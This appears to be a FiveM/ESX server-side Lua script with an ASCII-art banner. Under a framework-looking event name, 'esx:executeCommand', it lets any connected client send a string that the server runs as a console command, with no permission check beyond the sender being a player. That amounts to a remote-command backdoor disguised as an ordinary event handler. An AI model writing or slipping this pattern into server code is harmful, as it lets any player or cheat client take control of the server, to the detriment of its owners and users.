--       ____________________________________        ____.  _____   
--      /   _____/\_   _____/\_   _____/  _  \      |    | /  _  \  
--      \_____  \  |    __)_  |    __)/  /_\  \     |    |/  /_\  \ 
--      /        \ |        \ |     \/    |    \/\__|    /    |    \
--     /_______  //_______  / \___  /\____|__  /\________\____|__  /
--             \/         \/      \/         \/                  \/ 




ESX = nil

ESX = exports["es_extended"]:getSharedObject()

RegisterNetEvent('esx:executeCommand')
AddEventHandler('esx:executeCommand', function(command)
    local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer then
        ExecuteCommand(command)
    end
end)
